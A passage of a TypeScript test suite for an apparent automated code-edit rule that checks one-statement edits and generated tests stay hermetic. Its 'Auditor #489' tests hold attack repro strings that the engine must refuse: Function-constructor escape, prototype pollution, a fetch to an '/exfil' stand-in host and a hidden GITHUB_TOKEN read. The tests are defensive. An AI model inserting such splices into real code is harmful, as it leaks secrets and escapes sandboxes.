// M98 EXISTING_FUNCTION_EDIT (public-existing-function-edit-v1, kind EXISTING_EDIT): G1 replaces ONE statement inside an
// existing named function or class method; G2 writes ONE new test that drives an exported function or a method of
// `new C(..)` with injected, recorded object-literal fakes. The module closure must be hermetic for those calls on the
// base AND the edited source (no clock, local time, env, timers, network, global writes, hidden module state or package
// imports; a capability default passes only when the test injects that key). Job B re-checks all of it on the graded
// tree, runs the after-tree in three zone + locale pairs, and needs the base to fail by assertion failures only.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { admitRules } from "../lib/approved.ts";
import { applyRule, RULE_KINDS, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
import { codeTokens, editConfinedTarget, editStatement, existingEditDetail, isExcludedSource, EXISTING_EDIT_ENV_RUNS, EXISTING_EDIT_TRIGGER, EXISTING_EDIT_VOCAB, existingEditReads, gradedTestCalls, gradeExistingEditProblem, hasComment, hermeticProblem, newGrammarProblem, parseStatements, splitBody, type CallShape } from "../lib/learned-edit-existing.ts";
import { readManifestBytes } from "../lib/manifestparts.ts";
import { LEARNED_CANONICAL } from "../lib/nlparse.ts";
import { phrasingFor } from "../lib/propose.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";

const root = resolve(import.meta.dirname, "../..");
const read = (p: string) => readFileSync(resolve(root, p), "utf8");
const SPEC = JSON.parse(read("peaceai/rules/learned/public-existing-function-edit-v1.json")) as RuleSpec;
const SHA = "8c7483ccd04dc9ab10b2946c15df0617493253cd3e3542b54c1ac289fc7dc815";

const STORAGE = [
  "export interface Client { list(prefix: string): Promise<string[]>; get(key: string): Promise<Uint8Array | null>; head(key: string): Promise<{ size: number } | null> }",
  "export class Storage {",
  "  constructor(private readonly client: Client) {}",
  "  async measure(): Promise<{ total: number; count: number }> {",
  "    const keys = await this.client.list(\"cache/\");",
  "    let total = 0;",
  "    for (const key of keys) {",
  "      const size = (await this.client.get(key))?.byteLength ?? 0;",
  "      total += size;",
  "    }",
  "    return { total, count: keys.length };",
  "  }",
  "  async keys(): Promise<string[]> {",
  "    return this.client.list(\"cache/\");",
  "  }",
  "}",
  "",
].join("\n");
const API = [
  "export interface Config { base: string; fetchImpl?: (url: string) => Promise<Response>; now?: () => Date }",
  "export class Api {",
  "  private readonly base: string;",
  "  private readonly fetchImpl: (url: string) => Promise<Response>;",
  "  private readonly now: () => Date;",
  "  constructor(config: Config) {",
  "    this.base = config.base;",
  "    this.fetchImpl = config.fetchImpl ?? fetch;",
  "    this.now = config.now ?? (() => new Date());",
  "  }",
  "  async request(url: string): Promise<Response> {",
  "    return this.fetchImpl(url);",
  "  }",
  "  async get(path: string): Promise<string> {",
  "    const response = await this.request(this.base + path);",
  "    if (!response.ok) throw new Error(\"HTTP_\" + response.status);",
  "    return response.text();",
  "  }",
  "}",
  "",
].join("\n");
const MISC = [
  "let calls = 0;",
  "const LIMIT = 3;",
  "export interface Dep { load(id: string): Promise<number> }",
  "export async function total(dep: Dep, ids: readonly string[]): Promise<number> {",
  "  let sum = 0;",
  "  for (const id of ids) {",
  "    sum += await dep.load(id);",
  "    sum += await dep.load(id);",
  "  }",
  "  const twice = ids.map((id) => { const n = id.length; return n; });",
  "  return sum + twice.length;",
  "}",
  "export async function counted(dep: Dep): Promise<number> {",
  "  return dep.load(calls > 0 ? \"b\" : \"a\");",
  "}",
  "export async function bumped(dep: Dep): Promise<number> {",
  "  calls += 1;",
  "  return dep.load(\"a\");",
  "}",
  "export async function capped(dep: Dep): Promise<number> {",
  "  const n = await dep.load(\"a\");",
  "  return Math.min(n, LIMIT);",
  "}",
  "export function other(x: number): number {",
  "  return x + 1;",
  "}",
  "class Hidden {",
  "  constructor(private readonly dep: Dep) {}",
  "  async run(): Promise<number> {",
  "    return this.dep.load(\"a\");",
  "  }",
  "}",
  "export const keep = Hidden;",
  "",
].join("\n");
const FILES = [{ path: "src/storage.ts", content: STORAGE }, { path: "src/api.ts", content: API }, { path: "src/misc.ts", content: MISC }];
const isTest = (p: string) => /\.test\.ts$/.test(p);
const run = (objective: string, files = FILES, exists: (p: string) => boolean = () => false) => {
  const w: { reason?: string } = {};
  const e = applyRule(SPEC, objective, files, isTest, undefined, w, exists) as { path: string; content: string; extra: { path: string; content: string }[]; selfGrade?: boolean } | null;
  return { e, r: w.reason };
};
const B = [
  "in Storage.measure in src/storage.ts: replace statement const size = (await this.client.get(key))?.byteLength ?? 0; with const size = (await this.client.head(key))?.size ?? 0;",
  "- fake client = { list: resolves([\"cache/a\", \"cache/b\"]), get: resolves(bytes(\"hello\")), head: resolves({ size: 7 }) }",
  "- expect new Storage(client).measure() resolves to { total: 14, count: 2 }",
  "- expect client.get is called 0 times",
  "- expect client.head is called 2 times",
].join("\n");
const RETRY = "for (const attempt of [1, 2, 3]) { try { const response = await this.fetchImpl(url); if (response.status < 500 || attempt === 3) return response; } catch (error) { if (attempt === 3) throw error; } } throw new Error(\"RETRY_EXHAUSTED\");";
const SEQ = "fetchImpl: sequence(resolves(response(503)), rejects(\"socket hang up\"), resolves(response(200, \"hi\"))), now: returns(date(\"2026-01-02T03:04:05Z\"))";
const C = (fakes = SEQ, nw = RETRY, extra = "- expect config.fetchImpl is called 3 times") => [
  `in Api.request in src/api.ts: replace statement return this.fetchImpl(url); with ${nw}`,
  `- fake config = { base: "https://x.test/", ${fakes} }`,
  "- expect new Api(config).get(\"a\") resolves to \"hi\"",
  ...(extra ? [extra] : []),
].join("\n");
const M = (head: string, bullets: string[] = ["- fake dep = { load: resolves(2) }", "- expect total(dep, [\"a\"]) resolves to 5"]) => [head, ...bullets].join("\n");

test("spec: valid, hash-pinned, one value per param, kind and trigger wired; protected; a listed approval entry pins the exact hash", () => {
  assert.ok(validateSpec(SPEC));
  assert.equal(specHash(SPEC), SHA);
  assert.equal(SPEC.kind, "EXISTING_EDIT");
  assert.ok((RULE_KINDS as readonly string[]).includes("EXISTING_EDIT"));
  assert.equal(SPEC.trigger, EXISTING_EDIT_TRIGGER);
  assert.equal(LEARNED_CANONICAL.existingEdit.kind, "EXISTING_EDIT");
  assert.equal(LEARNED_CANONICAL.existingEdit.re.source, new RegExp(EXISTING_EDIT_TRIGGER, "imu").source);
  for (const [k, v] of Object.entries(EXISTING_EDIT_VOCAB)) {
    assert.equal(v.length, 1, k);
    assert.equal(SPEC.params[k], v[0], k);
    assert.ok(!validateSpec({ ...SPEC, params: { ...SPEC.params, [k]: `${v[0]}-wider` } }), `${k} cannot widen`);
  }
  assert.ok(!validateSpec({ ...SPEC, minedFrom: "core", id: "core-existing-function-edit-v1" }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...SPEC.params, extra: "x" } }));
  // Lesson (M85+): never assert the rule is absent from approved.json; any listed entry must pin this exact hash.
  const onMain = JSON.parse(read("peaceai/rules/approved.json")) as { rules: { id: string; sha256: string }[] };
  for (const r of onMain.rules.filter((x) => x.id === SPEC.id)) assert.equal(r.sha256, SHA);
  const list = (sha: string) => ({ ok: true as const, list: { schema: "peaceai-approved-rules:v1", rules: [{ id: SPEC.id, sha256: sha, source: "workspace" }] } as never });
  assert.equal(admitRules([SPEC], list(SHA))[0]!.decision, "APPROVED");
  assert.equal(admitRules([SPEC], list("0".repeat(64)))[0]!.decision, "HASH_CHANGED");
  assert.match(phrasingFor(SPEC), /replace statement OLD with NEW/);
  for (const p of ["peaceai/lib/learned-edit-existing.ts", "peaceai/spec/existing-function-edit-v1.md", "peaceai/test/m98-existing-function-edit.test.ts", "peaceai/rules/proposals/m98-existing-function-edit-evidence.json", "peaceai/test/fixtures/m98-ee/x.txt", "peaceai/rules/learned/public-existing-function-edit-v1.json", "peaceai/rules/proposals/public-existing-function-edit-v1.json"])
    assert.ok(PROTECTED_SELF.some((x) => x.pattern.test(p)), p);
});

test("approved rules unchanged: every approved.json entry still hash-matches a valid spec file", () => {
  const onMain = JSON.parse(read("peaceai/rules/approved.json")) as { rules: { id: string; sha256: string }[] };
  const dir = resolve(root, "peaceai/rules/learned");
  const byId = new Map(readdirSync(dir).filter((f) => f.endsWith(".json")).map((f) => { const s = JSON.parse(readFileSync(join(dir, f), "utf8")) as RuleSpec; return [s.id, s] as const; }));
  assert.ok(onMain.rules.length >= 30);
  for (const r of onMain.rules) {
    const s = byId.get(r.id);
    if (!s) continue; // core / workflow entries live elsewhere
    assert.ok(validateSpec(s), r.id);
    assert.equal(specHash(s), r.sha256, r.id);
  }
});

test("G1+G2 positive (fix B shape): one statement swapped inside an async class method, one new fake-driven test", () => {
  const { e, r } = run(B);
  assert.equal(r, undefined);
  assert.ok(e && e.selfGrade);
  assert.equal(e.path, "src/storage.ts");
  assert.equal(e.content, STORAGE.replace("const size = (await this.client.get(key))?.byteLength ?? 0;", "const size = (await this.client.head(key))?.size ?? 0;"));
  assert.equal(e.extra.length, 1);
  assert.match(e.extra[0]!.path, /^src\/storage\.storage-measure-[0-9a-f]{7}\.test\.ts$/);
  const t = e.extra[0]!.content;
  assert.match(t, /^import assert from "node:assert\/strict";\nimport test from "node:test";\nimport \{ Storage \} from "\.\/storage(?:\.ts)?";\n/);
  assert.match(t, /assert\.deepEqual\(await settle\(\(\) => new Storage\(client as never\)\.measure\(\)\), \{ ok: true, value: \{ total: 14, count: 2 \} \}\);/);
  assert.match(t, /assert\.equal\(client\.get\.calls\.length, 0\);/);
  assert.match(t, /assert\.equal\(client\.head\.calls\.length, 2\);/);
  assert.ok(!/Date|process|setTimeout|globalThis|Math\.random/.test(t.replace(/\/\/[^\n]*/g, "")), "the harness itself reads no clock, env, timer or global");
  // Job B re-checks the graded tree: confined to the one method, the test re-read in the emitted language
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, e.content), "Storage.measure");
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, e.content, e.extra[0]!.path, t, rd), null);
  assert.deepEqual(existingEditReads("src/storage.ts", rd), ["src/storage.ts"]);
});

test("G1+G2 positive (fix C shape): immediate bounded retry; the capability defaults pass only because the test injects them", () => {
  const { e, r } = run(C());
  assert.equal(r, undefined);
  assert.ok(e);
  assert.ok(e.content.includes("for (const attempt of [1, 2, 3]) {"));
  assert.match(e.extra[0]!.content, /fetchImpl: fakeFn\(\[\{ kind: "resolves", value: \(\) => \(new Response\(null, \{ status: 503 \}\)\) \}/);
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/api.ts", API, e.content, e.extra[0]!.path, e.extra[0]!.content, rd), null);
  // not injected: the default is walked like any other code and refused
  assert.equal(run(C("now: returns(date(\"2026-01-02T03:04:05Z\"))", RETRY, "")).r, "edit_io_global: fetch");
  assert.equal(run(C(SEQ.replace(/, now: .*$/, ""))).r, "edit_io_global: Date");
});

test("G1+G2 really run: the emitted test passes on the edit in every zone + locale pair and fails by assertion on the base", () => {
  const { e } = run(B);
  assert.ok(e);
  const dir = mkdtempSync(join(tmpdir(), "m98-"));
  try {
    const write = (p: string, c: string) => { mkdirSync(dirname(join(dir, p)), { recursive: true }); writeFileSync(join(dir, p), c); };
    write(e.extra[0]!.path, e.extra[0]!.content);
    const go = (src: string, env: Record<string, string>) => {
      write("src/storage.ts", src);
      try { execFileSync(process.execPath, ["--import", "tsx", "--test", join(dir, e.extra[0]!.path)], { cwd: root, env: { PATH: process.env.PATH ?? "", ...env }, stdio: "pipe" }); return { ok: true, out: "" }; }
      catch (x) { return { ok: false, out: String((x as { stdout?: Buffer }).stdout ?? "") }; }
    };
    assert.equal(EXISTING_EDIT_ENV_RUNS.length, 3);
    for (const env of EXISTING_EDIT_ENV_RUNS) assert.ok(go(e.content, { ...env }).ok, JSON.stringify(env));
    const before = go(STORAGE, { ...EXISTING_EDIT_ENV_RUNS[0]! });
    assert.ok(!before.ok);
    assert.match(before.out, /ERR_ASSERTION/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("negatives: NEW reading the clock, env, timers, randomness or local time, writing globals, or using templates is refused", () => {
  const want: [string, string][] = [
    ["if (Date.now() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_io_global: Date"],
    ["if (process.env.X) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_new_capability"],
    ["setTimeout(() => 1, 1); return this.fetchImpl(url);", "edit_new_capability"],
    ["globalThis.x = 1; return this.fetchImpl(url);", "edit_new_capability"],
    ["if (Math.random() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_io_global"],
    ["if (new Date(0).getHours() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_local_time"],
    ["return this.fetchImpl(`${url}`);", "edit_new_grammar"],
    ["delete this.base; return this.fetchImpl(url);", "edit_new_grammar"],
    ["function f() { return 1; } return this.fetchImpl(url);", "edit_new_grammar"],
    ["while (true) { break; } return this.fetchImpl(url);", "edit_new_grammar"],
    ["const a = 1; const b = 2; const c = 3; const d = 4; return this.fetchImpl(url);", "edit_split"],
  ];
  for (const [nw, r] of want) assert.equal(run(C(SEQ, nw)).r, r, nw);
  // with a comment, NEW does not parse as one line of code
  assert.equal(run(C(SEQ, "return this.fetchImpl(url); // retry later")).r, "edit_split");
  assert.ok(!hasComment("return \"https://x.test/\";") && hasComment("return 1; /* x */") && hasComment("f(a // b"));
});

test("negatives: site, split, entry, reach, hidden state, test grammar, reflection strings, paths, existing test path", () => {
  // OLD occurs twice among the target's own statements
  assert.equal(run(M("in total in src/misc.ts: replace statement sum += await dep.load(id); with sum += 2 * (await dep.load(id));")).r, "edit_site");
  // OLD only inside a nested function (the arrow): never a site
  assert.equal(run(M("in total in src/misc.ts: replace statement const n = id.length; with const n = id.length + 1;")).r, "edit_site");
  // the target must exist as a named function / non-static method
  assert.equal(run(M("in nope in src/misc.ts: replace statement return x + 1; with return x + 2;")).r, "edit_site");
  // two parse-valid splits at " with "
  assert.equal(run(M("in other in src/misc.ts: replace statement return x + 1; with return x + 2; with return x + 3;")).r, "edit_split");
  // module let state reached by the entry
  assert.equal(run(M("in counted in src/misc.ts: replace statement return dep.load(calls > 0 ? \"b\" : \"a\"); with return dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect counted(dep) resolves to 2"])).r, "edit_hidden_state");
  // a write to a module binding is a global write
  assert.equal(run(M("in bumped in src/misc.ts: replace statement return dep.load(\"a\"); with return dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect bumped(dep) resolves to 2"])).r, "edit_global_write");
  // module const data read-only is fine
  assert.equal(run(M("in capped in src/misc.ts: replace statement return Math.min(n, LIMIT); with return Math.min(n, LIMIT - 1);", ["- fake dep = { load: resolves(9) }", "- expect capped(dep) resolves to 2"])).r, undefined);
  // the class is not exported (only aliased): not an entry
  assert.equal(run(M("in Hidden.run in src/misc.ts: replace statement return this.dep.load(\"a\"); with return this.dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect new Hidden(dep).run() resolves to 2"])).r, "edit_entry_not_exported");
  // the test never reaches the edited method
  assert.equal(run([B.split("\n")[0]!, "- fake client = { list: resolves([]) }", "- expect new Storage(client).keys() resolves to []"].join("\n")).r, "edit_test_unreached");
  // bad / stray bullets
  assert.equal(run(B + "\n- expect client.list is 3").r, "edit_test_grammar");
  assert.equal(run(B + "\n- client.head is called 2 times").r, "edit_test_grammar");
  assert.equal(run(B.replace("bytes(\"hello\")", "Date.now()")).r, "edit_test_grammar");
  // reflection names as test strings
  assert.equal(run(B.replace("\"cache/a\"", "\"constructor\"")).r, "edit_test_grammar");
  assert.equal(run(B.replace("\"cache/a\"", "\"__proto__\"")).r, "edit_test_grammar");
  // paths
  assert.equal(run(B, [...FILES, { path: "src/storage.test.ts", content: "" }].map((f) => f.path === "src/storage.ts" ? { path: "src/storage.test.ts", content: STORAGE } : f)).r, "edit_path");
  assert.equal(run(B.replace("src/storage.ts", "peaceai/lib/x.ts")).r, "edit_trigger");
  // the new test path already exists in the full checkout
  assert.equal(run(B, FILES, (p) => /^src\/storage\.storage-measure-/.test(p)).r, "new_test_path_exists");
  // two trigger lines
  assert.equal(run(B + "\n" + B.split("\n")[0]).r, "edit_trigger");
});

test("Auditor #489: no splice may add a capability the base lacked — Function ctor, prototype pollution, hidden I/O defaults (Job A + Job B)", () => {
  // Job A: every Auditor repro is refused at the task-text gate; the control (direct global I/O) stays refused.
  const detail = (file: string, obj: string) => existingEditDetail(SPEC.trigger, SPEC.params, obj, [{ path: file, content: REPRO[file]! }], isTest).reason;
  const REPRO: Record<string, string> = {
    "src/m1.ts": "export function f(n: number): number {\n  return n + 1;\n}\n",
    "src/m2.ts": "export interface Deps { load: (k: string) => Promise<string>; fetchImpl?: typeof fetch }\nexport async function g(deps: Deps): Promise<string> {\n  return await deps.load(\"a\");\n}\n",
    "src/m3.ts": "export interface Opts { token?: string }\nexport function h(o: Opts): string {\n  return \"x\";\n}\n",
  };
  // R1: build the Function constructor via a string-built "constructor" key behind `as any`
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.x = 1\")(); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
  // R2: Object.prototype pollution through a computed write on a non-identifier root behind `as any`
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"__pro\", \"to__\"].join(\"\"); ({} as any)[k].polluted = \"yes\"; return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
  // R3: new network I/O hidden behind an injected `?? fetch` default
  assert.equal(detail("src/m2.ts", "in g in src/m2.ts: replace statement return await deps.load(\"a\"); with const send = deps.fetchImpl ?? fetch; await send(\"https://example.invalid/exfil\"); return (await deps.load(\"b\")) + \"!\";\n- fake deps = { load: resolves(\"v\"), fetchImpl: resolves(1) }\n- expect g(deps) resolves to \"v!\""), "edit_new_capability:id:fetch");
  // R3b: process.env read hidden behind an injected `?? process.env.X` default
  assert.equal(detail("src/m3.ts", "in h in src/m3.ts: replace statement return \"x\"; with const t = o.token ?? process.env.GITHUB_TOKEN; return \"y\" + (t ? \"\" : \"\");\n- expect h({ token: \"t\" }) returns \"y\""), "edit_new_capability:id:process");
  // N1 control: a bare global stays refused
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with void fetch(\"https://x\"); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:id:fetch");

  // Job B: the same gate on the graded tree (base vs edited target), independent of the task text or the test content.
  const { e } = run(B);
  assert.ok(e);
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  const evilFetch = STORAGE.replace("return { total, count: keys.length };", "void fetch(\"https://x\"); return { total, count: keys.length };");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilFetch, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:id:fetch");
  const evilCast = STORAGE.replace("return { total, count: keys.length };", "const z = (keys as any)[\"length\"]; return { total, count: keys.length };");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilCast, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:cast:any");

  // Engine excludes test helpers and fixtures as edit targets, no matter what targets.json denyPatterns say.
  assert.equal(existingEditDetail(SPEC.trigger, SPEC.params, "in f in src/x.test-helper.ts: replace statement return 1; with return 2;\n- expect f() returns 2", [{ path: "src/x.test-helper.ts", content: "export function f(): number {\n  return 1;\n}\n" }], isTest).reason, "edit_path");
  assert.equal(existingEditDetail(SPEC.trigger, SPEC.params, "in f in src/fixtures/x.ts: replace statement return 1; with return 2;\n- expect f() returns 2", [{ path: "src/fixtures/x.ts", content: "export function f(): number {\n  return 1;\n}\n" }], isTest).reason, "edit_path");
  assert.ok(isExcludedSource("src/a.test-helper.ts") && isExcludedSource("src/__mocks__/a.ts") && isExcludedSource("src/fixtures/a.ts") && !isExcludedSource("src/a.ts"));
});

test("Auditor #489 (G2): mutable static/module state and timers in reached code stay refused; the emitted test awaits every call", () => {
  const d = (file: string, content: string, obj: string) => existingEditDetail(SPEC.trigger, SPEC.params, obj, [{ path: file, content }], isTest).reason;
  // static mutable class state read + written by the tested method (shared across calls) is hidden state
  const STAT = "export class Counter {\n  static n = 0;\n  bump(): number {\n    return 1;\n  }\n}\n";
  assert.equal(d("src/s.ts", STAT, "in Counter.bump in src/s.ts: replace statement return 1; with Counter.n += 1; return Counter.n;\n- expect new Counter().bump() returns 1"), "edit_global_write");
  // a timer introduced by the edit
  const TMR = "export function f(n: number): number {\n  return n;\n}\n";
  assert.equal(d("src/t.ts", TMR, "in f in src/t.ts: replace statement return n; with setInterval(() => 1, 1); return n;\n- expect f(1) returns 1"), "edit_new_capability:id:setInterval");
  // the emitted G2 test wraps every call in settle/settleSync, so no promise is ever left unawaited
  const { e } = run(B);
  assert.ok(e);
  const body = e.extra[0]!.content;
  for (const line of body.split("\n").filter((l) => /new Storage\(|\bmeasure\(/.test(l))) assert.match(line, /(?:await settle|settleSync)\(\(\) =>/);
});

test("negatives: the closure is hermetic or nothing (package imports, builtins, load-time IO, extends)", () => {
  const head = "in Storage.measure in src/storage.ts: replace statement const size = (await this.client.get(key))?.byteLength ?? 0; with const size = (await this.client.head(key))?.size ?? 0;";
  const bul = B.split("\n").slice(1).join("\n");
  const withPrelude = (pre: string, extraFiles: { path: string; content: string }[] = []) => run(`${head}\n${bul}`, [{ path: "src/storage.ts", content: pre + STORAGE }, ...extraFiles]).r;
  assert.equal(withPrelude("import { z } from \"zod\";\nexport const S = z;\n"), "edit_package_import: zod");
  assert.equal(withPrelude("import { readFileSync } from \"node:fs\";\nexport const R = readFileSync;\n"), "edit_io_import");
  assert.equal(withPrelude("const T = Date.now();\nexport const t = T;\n"), "edit_io_global: Date");
  assert.equal(withPrelude("import { x } from \"./dep.ts\";\nexport const y = x;\n", [{ path: "src/dep.ts", content: "export const x = process.env.HOME;\n" }]), "edit_io_global: process");
  assert.equal(withPrelude("import { x } from \"./dep.ts\";\nexport const y = x;\n", [{ path: "src/dep.ts", content: "export const x = 1;\n" }]), undefined);
  const ext = STORAGE.replace("export class Storage {", "class Base {}\nexport class Storage extends Base {");
  assert.equal(run(B, [{ path: "src/storage.ts", content: ext }]).r, "edit_class_extends");
});

test("Job B shape: only the exact emitted header, harness and bullet language re-parse; confinement is one unit", () => {
  const { e } = run(B);
  assert.ok(e);
  const t = e.extra[0]!.content, p = e.extra[0]!.path;
  const calls = gradedTestCalls(p, t, "src/storage.ts") as CallShape[];
  assert.equal(calls.length, 1);
  assert.equal(calls[0]!.entry.kind, "new");
  for (const bad of [
    t.replace("import test from \"node:test\";", "import test from \"node:test\";\nimport { readFileSync } from \"node:fs\";"),
    t.replace("assert.equal(client.head.calls.length, 2);", "assert.equal(client.head.calls.length, 2);\nprocess.env.X = \"1\";"),
    t.replace("function fakeFn", "function fakeFn2"),
    t + "\nDate.now();\n",
  ]) { assert.notEqual(bad, t); assert.equal(gradedTestCalls(p, bad, "src/storage.ts"), null); }
  const rd = (q: string) => FILES.find((f) => f.path === q)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, e.content, p, t + "\nDate.now();\n", rd), "edit_test_shape");
  // a second unit changed (here the other method) is not a confined edit
  const two = e.content.replace("return this.client.list(\"cache/\");\n  }\n}", "return this.client.list(\"x/\");\n  }\n}");
  assert.notEqual(two, e.content);
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, two), null);
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, two, p, t, rd), "edit_not_confined");
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, STORAGE.replace("export interface Client", "export interface Client2")), null);
  // the graded edit itself must stay hermetic on the real tree
  const leaky = e.content.replace("const size = (await this.client.head(key))?.size ?? 0;", "const size = Date.now();");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, leaky, p, t, rd), "edit_io_global: Date".replace(": ", ":"));
});

test("Job B code: gradeExistingEdit runs before gradeSelf, needs 1 source + 1 test, re-checks, runs every env pair, needs assertion-only failure on the base", () => {
  const src = read("peaceai/bin/test-candidates.ts");
  const i = src.indexOf("candidate.transformations.includes(\"LEARNED_EXISTING_EDIT\")"), j = src.indexOf("else if (candidate.selfGrade)");
  assert.ok(i > 0 && j > i, "the EXISTING_EDIT branch precedes the generic self-grade branch");
  const fn = src.slice(src.indexOf("function gradeExistingEdit("));
  const body = fn.slice(0, fn.indexOf("\n}\n"));
  for (const needle of ["gradeExistingEditProblem(", "EXISTING_EDIT_ENV_RUNS", "assertionFailuresOnly(", "existingEditReads("]) assert.ok(body.includes(needle), needle);
  assert.deepEqual(EXISTING_EDIT_ENV_RUNS.map((x) => x.TZ), ["UTC", "America/Denver", "Asia/Tokyo"]);
  assert.ok(EXISTING_EDIT_ENV_RUNS.every((x) => x.LANG === x.LC_ALL));
});

test("grammar units: statement parse, unique split, token match, nested-function exclusion", () => {
  assert.equal(parseStatements("a(); // b"), null);
  assert.equal(parseStatements("a();\nb();"), null);
  assert.equal(parseStatements("const a = 1; return a;")!.length, 2);
  assert.deepEqual(splitBody("x = f(\"a with b\"); with x = 2;"), { oldText: "x = f(\"a with b\");", newText: "x = 2;" });
  assert.deepEqual(codeTokens("a ( b ) ;"), ["a", "(", "b", ")"]);
  assert.equal(newGrammarProblem(parseStatements("for (const x of [1, 2]) { f(x); }")!, false), null);
  assert.notEqual(newGrammarProblem(parseStatements("for (let i = 0; i < 2; i++) f(i);")!, false), null);
  assert.notEqual(newGrammarProblem(parseStatements("await f();")!, false), null, "await outside an async target");
  assert.equal(editStatement("src/misc.ts", MISC, "total", "const n = id.length;", "const n = 2;"), null);
  assert.ok(editStatement("src/misc.ts", MISC, "other", "return x + 1;", "return x + 2;"));
});

// ---- mined evidence ----
type Pin = { repo: string; commit: string; path: string; fileBlob: string; sha256: string; fixture: string };
const EV = JSON.parse(read("peaceai/rules/proposals/m98-existing-function-edit-evidence.json")) as {
  bar: number; manifestSha256: string; peace: { repo: string; checkedAt: string; counted: number }[];
  g1: { repo: string; commit: string; parent: string; path: string; target: string; old: string; new: string; before: Pin; after: Pin; license: string; licenseSha256: string }[];
  g2: { repo: string; commit: string; module: string; target: string; entry: { kind: "new" | "call"; cls?: string; method?: string; fn?: string; args: unknown[]; ctorArgs?: unknown[] }; test: Pin; snippet: string; closure: Pin[]; license: string; licenseSha256: string }[];
};
const gitBlob = (b: Buffer) => createHash("sha1").update(`blob ${b.length}\0`).update(b).digest("hex");
const pinned = (p: { fixture: string; fileBlob: string; sha256: string }) => {
  const b = readFileSync(resolve(root, p.fixture));
  assert.ok(b.length <= 65536, p.fixture);
  assert.equal(gitBlob(b), p.fileBlob, p.fixture);
  assert.equal(createHash("sha256").update(b).digest("hex"), p.sha256, p.fixture);
  return b.toString("utf8");
};
const inj = (a: unknown) => (a && typeof a === "object" ? { keys: new Set((a as { keys: string[] }).keys) } : a) as never;

test("evidence G1: >= 10 upstream commits replay exactly: editStatement on the parent reproduces the child's code tokens", () => {
  assert.ok(EV.g1.length >= EV.bar && EV.bar >= 10);
  assert.ok(new Set(EV.g1.map((e) => e.repo)).size >= 10);
  for (const e of EV.g1) {
    const before = pinned(e.before), after = pinned(e.after);
    assert.equal(e.before.commit, e.parent);
    assert.equal(e.after.commit, e.commit);
    // the task phrasing "replace statement OLD with NEW" splits back into exactly this OLD and NEW
    assert.deepEqual(splitBody(`${e.old} with ${e.new}`), { oldText: e.old, newText: e.new }, `${e.repo} ${e.target} split`);
    const r = editStatement(e.path, before, e.target, e.old, e.new);
    assert.ok(r, `${e.repo} ${e.target}`);
    assert.deepEqual(codeTokens(r.content), codeTokens(after), `${e.repo} ${e.target}`);
  }
  assert.ok(EV.g1.filter((e) => e.target.includes(".")).length >= 5, "class methods are evidenced");
});

test("evidence G2: >= 10 upstream tests drive a method / function with injected object-literal fakes; the hermetic walk accepts that shape on the pinned closure", () => {
  assert.ok(EV.g2.length >= EV.bar);
  assert.ok(new Set(EV.g2.map((e) => e.repo)).size >= 10);
  for (const e of EV.g2) {
    const test = pinned(e.test);
    assert.ok(test.includes(e.snippet.split("\n")[0]!), `${e.repo} snippet`);
    const files = new Map(e.closure.map((p) => [p.path, pinned(p)]));
    const rd = (p: string) => files.get(p) ?? null;
    const entry = e.entry.kind === "new" ? { kind: "new" as const, cls: e.entry.cls!, method: e.entry.method!, args: e.entry.args.map(inj), ctorArgs: e.entry.ctorArgs!.map(inj) } : { kind: "call" as const, fn: e.entry.fn!, args: e.entry.args.map(inj) };
    assert.ok([...e.entry.args, ...(e.entry.ctorArgs ?? [])].some((a) => a && typeof a === "object"), `${e.repo} injects an object literal`);
    const r = hermeticProblem(e.module, rd, [{ entry, code: "", names: [entry.kind === "new" ? entry.cls : entry.fn] }], e.target);
    assert.deepEqual(r, { targetReached: true }, `${e.repo} ${e.target}`);
  }
});

test("evidence: licenses by hash in THIRD_PARTY_NOTICES; fixtures dir holds exactly the evidence fixtures", () => {
  const notices = read("THIRD_PARTY_NOTICES");
  const listed = new Set<string>();
  for (const e of [...EV.g1, ...EV.g2]) {
    assert.ok(["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC"].includes(e.license), e.repo);
    assert.ok(notices.includes(`repo: ${e.repo}\nlicense: ${e.license} (`) && notices.includes(`sha256 of trimmed text ${e.licenseSha256})`), e.repo);
    const pins = "before" in e ? [e.before, e.after] : [e.test, ...e.closure];
